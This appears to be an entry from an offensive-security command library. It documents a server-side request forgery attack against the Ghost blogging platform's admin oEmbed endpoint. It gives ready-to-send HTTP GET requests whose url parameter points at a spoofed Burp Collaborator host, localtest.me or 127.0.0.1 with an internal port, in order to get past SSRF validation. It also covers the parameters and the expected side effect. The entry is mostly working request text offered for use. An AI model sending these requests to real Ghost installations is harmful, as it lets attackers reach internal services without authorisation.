---
data: >-
  GET
  /ghost/api/v3/admin/oembed/?url=http://spoofed.burpcollaborator.net/index.html&type=embed
  HTTP/1.1

  Host: localhost:2368

  Cookie: ghost-admin-api-session=your-session-cookie
tags:
  - ssrf
  - http-request
  - exploitation
type: command
executor: http
platforms:
  - Web
id: 22d5572d-744e-4373-ab3c-bac88fa6feba
created_at: '2025-12-14T04:39:09.644Z'
updated_at: '2025-12-14T04:39:09.644Z'
verified: false
validated: true
submitted: true
---
# get-oembed-ssrf-request

## Command

```bash
GET /ghost/api/v3/admin/oembed/?url=http://spoofed.burpcollaborator.net/index.html&type=embed HTTP/1.1
Host: localhost:2368
Cookie: ghost-admin-api-session=your-session-cookie
```

## Description

Sends an HTTP GET request to Ghost's oEmbed admin endpoint with a crafted URL that bypasses SSRF validation, triggering an internal fetch to a localhost-resolving domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The oEmbed URL parameter with spoofed hostname (e.g., http://spoofed.burpcollaborator.net/index.html) | Yes |
| `type` | Specifies oEmbed type as 'embed' | Yes |
| `Cookie` | Authenticated session cookie for publisher role | Yes |

## Examples

### Basic Usage

```bash
GET /ghost/api/v3/admin/oembed/?url=http://localtest.me/&type=embed HTTP/1.1
Host: localhost:2368
Authorization: Ghost your-api-key
```

### Advanced Usage

```bash
GET /ghost/api/v3/admin/oembed/?url=http://127.0.0.1:internal-port&type=embed HTTP/1.1
Host: target-ghost.com
Cookie: session=token
```

## Expected Output

JSON response with oEmbed data, but side-effect of internal SSRF request to the URL's resolved IP.

## Related

- [[procedures/Send-Crafted-oEmbed-Request-for-SSRF]]
- [[tools/Burp-Suite]]
